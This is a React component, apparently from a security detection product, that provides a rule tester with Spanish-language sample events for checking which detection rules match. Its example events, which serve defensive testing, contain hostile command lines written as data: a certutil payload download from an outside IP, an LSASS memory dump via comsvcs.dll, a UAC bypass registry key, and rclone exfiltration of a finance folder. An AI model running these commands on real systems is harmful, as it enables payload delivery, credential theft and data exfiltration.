'use client'

// Rule tester (engine POST /api/rules/test): write or pick an event,
// see which loaded rules match and on which fields, with no alert, no
// storage and no forwarding. The JSON editor is the source of truth;
// the examples only fill it.

import { useState } from 'react'
import { Flask, MagnifyingGlass, Play, ShieldCheck } from '@phosphor-icons/react'
import { EmptyState, SeverityBadge, MonoTag } from './ui-bits'
import { testRules, type RuleTestResult } from '@/lib/engine-writes'

const EXAMPLES: { label: string; event: Record<string, unknown> }[] = [
  {
    label: 'Descarga con certutil',
    event: { type: 'process.create', host: 'LAB-WKS-01', user: 'CORP\\ana', process: { pid: 4321, name: 'certutil.exe', command_line: 'certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe' } },
  },
  {
    label: 'Volcado de LSASS',
    event: { type: 'process.create', host: 'LAB-WKS-01', process: { pid: 4400, name: 'rundll32.exe', command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 744 C:\\Temp\\l.dmp full' } },
  },
  {
    label: 'Webshell en IIS',
    event: { type: 'process.create', host: 'WEB-01', process: { pid: 5100, name: 'cmd.exe', command_line: 'cmd.exe /c whoami' }, enrichment: { parent_name: 'w3wp.exe' } },
  },
  {
    label: 'Bypass de UAC',
    event: { type: 'registry.set', host: 'LAB-WKS-01', registry: { key: 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command', value_name: '(Default)', value: 'cmd.exe', operation: 'SetValue' } },
  },
  {
    label: 'Exfiltración con rclone',
    event: { type: 'process.create', host: 'FILE-01', process: { pid: 6100, name: 'rclone.exe', command_line: 'rclone.exe copy D:\\Finanzas mega:backup' } },
  },
  {
    label: 'Nota de rescate',
    event: { type: 'file.write', host: 'LAB-WKS-01', process: { pid: 7000, name: 'svchost.exe' }, file: { path: 'C:\\Users\\ana\\Documents\\HOW_TO_DECRYPT_FILES.txt' } },
  },
  {
    label: 'Benigno (no debe saltar)',
    event: { type: 'process.create', host: 'LAB-WKS-01', process: { pid: 8000, name: 'notepad.exe', command_line: 'notepad.exe todo.txt' } },
  },
]

const pretty = (v: unknown) => JSON.stringify(v, null, 2)

export function RuleTester({ onOpenRule }: { onOpenRule: (id: string) => void }) {
  const [text, setText] = useState(pretty(EXAMPLES[0].event))
  const [result, setResult] = useState<RuleTestResult | null>(null)
  const [error, setError] = useState('')
  const [busy, setBusy] = useState(false)

  async function run() {
    let event: Record<string, unknown>
    try {
      event = JSON.parse(text)
    } catch (e) {
      setResult(null)
      return setError('El evento no es JSON válido: ' + (e instanceof Error ? e.message : ''))
    }
    if (!event || typeof event !== 'object' || typeof event.type !== 'string') {
      setResult(null)
      return setError('Falta "type" (por ejemplo "process.create").')
    }
    setBusy(true)
    setError('')
    const res = await testRules(event as { type: string })
    setBusy(false)
    if (!res.ok) {
      setResult(null)
      return setError(res.status === 404 || res.status === 405 ? 'Este motor no incluye el probador: actualiza la instalación (sf-update).' : res.error)
    }
    setResult(res.data)
  }

  return (
    <section aria-label="Probador de reglas" className="grid gap-4 xl:grid-cols-[minmax(0,1fr)_minmax(0,1fr)]">
      <div className="panel flex min-w-0 flex-col">
        <div className="panel-head">
          <Flask size={15} aria-hidden className="text-blue-400" />
          <h2 className="text-sm font-medium text-zinc-100">Evento de prueba</h2>
          <span className="ml-auto text-[11px] text-zinc-500">formato de ingesta (NDJSON)</span>
        </div>
        <div className="px-4 pt-3">
          <p className="mb-2 text-xs text-zinc-500">Ejemplos:</p>
          <div className="flex flex-wrap gap-1.5">
            {EXAMPLES.map((ex) => (
              <button key={ex.label} type="button" onClick={() => { setText(pretty(ex.event)); setResult(null); setError('') }}
                className="rounded-md border border-white/10 px-2 py-1 text-[11px] text-zinc-300 hover:border-blue-400/40 hover:text-zinc-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">
                {ex.label}
              </button>
            ))}
          </div>
        </div>
        <div className="flex flex-1 flex-col px-4 py-3">
          <label htmlFor="rule-test-event" className="sr-only">Evento JSON</label>
          <textarea
            id="rule-test-event"
            value={text}
            onChange={(e) => setText(e.target.value)}
            spellCheck={false}
            rows={16}
            className="min-h-[18rem] flex-1 rounded-lg border border-zinc-800 bg-zinc-950/70 p-3 font-mono text-xs leading-relaxed text-zinc-200 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
          />
          <div className="mt-3 flex items-center gap-2">
            <button type="button" onClick={() => void run()} disabled={busy}
              className="inline-flex items-center gap-1.5 rounded-lg bg-blue-500 px-3.5 py-2 text-xs font-medium text-white hover:bg-blue-400 disabled:opacity-60 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">
              <Play size={13} weight="fill" aria-hidden /> {busy ? 'Probando…' : 'Probar contra las reglas'}
            </button>
            <span className="text-[11px] text-zinc-500">No genera alertas ni guarda nada.</span>
          </div>
          {error && <p role="alert" className="mt-2 text-xs text-red-300">{error}</p>}
        </div>
      </div>

      <div className="panel min-w-0">
        <div className="panel-head">
          <ShieldCheck size={15} aria-hidden className="text-blue-400" />
          <h2 className="text-sm font-medium text-zinc-100">Resultado</h2>
          {result && (
            <span className="ml-auto text-[11px] text-zinc-500">
              {result.evaluated} reglas evaluadas para {result.event_type}
            </span>
          )}
        </div>
        {!result ? (
          <EmptyState icon={Flask} title="Prueba un evento" hint="Elige un ejemplo o pega un evento real (por ejemplo, copiado del Flujo en vivo) y pulsa Probar." />
        ) : result.matches.length === 0 ? (
          <EmptyState icon={MagnifyingGlass} title="Ninguna regla coincide" hint={`Se evaluaron ${result.evaluated} reglas de ${result.event_type}. Si esperabas una alerta, revisa los campos o crea una regla nueva.`} />
        ) : (
          <ul role="status" className="divide-y divide-white/[0.05]">
            {result.matches.map((m) => (
              <li key={m.id} className="px-4 py-3">
                <div className="flex flex-wrap items-center gap-2">
                  <SeverityBadge severity={m.severity} />
                  <span className="text-[13px] font-medium text-zinc-100">{m.name}</span>
                  {m.mitre && <MonoTag className="border-blue-400/20 text-blue-200">{m.mitre}</MonoTag>}
                  {m.tactic && <span className="text-[11px] text-zinc-500">{m.tactic}</span>}
                  <button type="button" onClick={() => onOpenRule(m.id)}
                    className="ml-auto rounded-sm text-[11px] text-blue-300 underline-offset-4 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">
                    Ver regla
                  </button>
                </div>
                <p className="mt-1.5 text-[11px] text-zinc-500">
                  Coincide en: {m.matched_on.map((f) => <span key={f} className="mr-1.5 font-mono text-zinc-300">{f}</span>)}
                </p>
              </li>
            ))}
          </ul>
        )}
      </div>
    </section>
  )
}
